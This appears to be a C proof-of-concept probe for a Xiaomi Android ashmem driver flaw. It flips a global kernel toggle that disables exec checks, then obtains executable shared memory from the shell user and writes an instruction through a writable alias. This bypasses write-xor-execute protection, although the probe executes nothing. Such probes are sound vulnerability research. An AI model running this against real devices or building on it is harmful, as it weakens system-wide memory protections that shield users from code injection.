/*
 * l75_ashmem_exec.c - can uid 2000 get an executable anonymous mapping?
 *
 * The Xiaomi ashmem fork exposes /dev/ashmem_ignore_unset_prot_exec: writing
 * "1" to it sets a global flag that makes ASHMEM_SET_PROT_MASK accept
 * PROT_EXEC, and the mmap path then has no exec check of its own.  Normally
 * /dev/ashmem is EACCES for shell, but the name-encoded node
 * /dev/ashmemb8fc85c4-... is openable, so the question is whether the whole
 * chain works from uid 2000.
 *
 * Steps: flip the toggle, open an ashmem node, set size, ask for
 * PROT_READ|PROT_EXEC, then mmap(PROT_EXEC) and write a return instruction.
 * Nothing is executed.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ASHMEM_SET_NAME      0x41087701UL
#define ASHMEM_SET_SIZE      0x40087703UL
#define ASHMEM_GET_SIZE      0x00007704UL
#define ASHMEM_SET_PROT_MASK 0x40087705UL
#define ASHMEM_GET_PROT_MASK 0x00007706UL

static void show(const char *what, long rc, int e)
{
    if (rc >= 0)
        printf("  OK    %-44s rc=%ld\n", what, rc);
    else
        printf("  FAIL  %-44s errno=%d (%s)\n", what, e, strerror(e));
    errno = 0;
}

int main(void)
{
    printf("=== l75 ashmem exec probe (uid=%d) ===\n", (int)getuid());

    /* 1) flip the global "ignore unset prot exec" toggle */
    int tfd = open("/dev/ashmem_ignore_unset_prot_exec", O_RDWR | O_CLOEXEC);
    if (tfd < 0) { printf("  toggle open: errno=%d (%s)\n", errno, strerror(errno)); return 1; }
    errno = 0;
    ssize_t w = write(tfd, "1", 1);
    show("write '1' to ashmem_ignore_unset_prot_exec", (long)w, errno);
    close(tfd);

    /* 2) open an ashmem node that shell is allowed to touch */
    const char *nodes[] = {
        "/dev/ashmemb8fc85c4-35a6-4af8-9f96-a7c10139f9b2",
        "/dev/ashmem",
        "/dev/ashmem_ignore_unset_prot_read",
        NULL
    };
    int fd = -1;
    for (int i = 0; nodes[i]; i++) {
        errno = 0;
        fd = open(nodes[i], O_RDWR | O_CLOEXEC);
        printf("  open %-52s %s (errno=%d)\n", nodes[i], fd >= 0 ? "OK" : "FAIL", errno);
        if (fd >= 0) break;
        errno = 0;
    }
    if (fd < 0) return 2;

    /* 3) size + prot mask */
    errno = 0;
    long r = ioctl(fd, ASHMEM_SET_SIZE, 0x1000);
    show("ASHMEM_SET_SIZE(0x1000)", r, errno);

    errno = 0;
    r = ioctl(fd, ASHMEM_SET_PROT_MASK, PROT_READ | PROT_EXEC);
    show("ASHMEM_SET_PROT_MASK(READ|EXEC)", r, errno);

    errno = 0;
    long pm = ioctl(fd, ASHMEM_GET_PROT_MASK, 0);
    printf("  GET_PROT_MASK = %#lx\n", pm);

    /* 4) mmap executable */
    errno = 0;
    void *p = mmap(NULL, 0x1000, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) {
        printf("  FAIL  mmap(PROT_READ|PROT_EXEC) errno=%d (%s)\n", errno, strerror(errno));
    } else {
        printf("  OK    mmap(PROT_READ|PROT_EXEC) = %p\n", p);
        /* prove it is writable through a second mapping and executable */
        void *rw = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (rw != MAP_FAILED) {
            ((uint32_t *)rw)[0] = 0xd65f03c0u;   /* ret */
            printf("  OK    wrote 'ret' via RW alias at %p\n", rw);
        } else {
            printf("  note  RW alias failed errno=%d (%s)\n", errno, strerror(errno));
        }
    }

    close(fd);
    return 0;
}
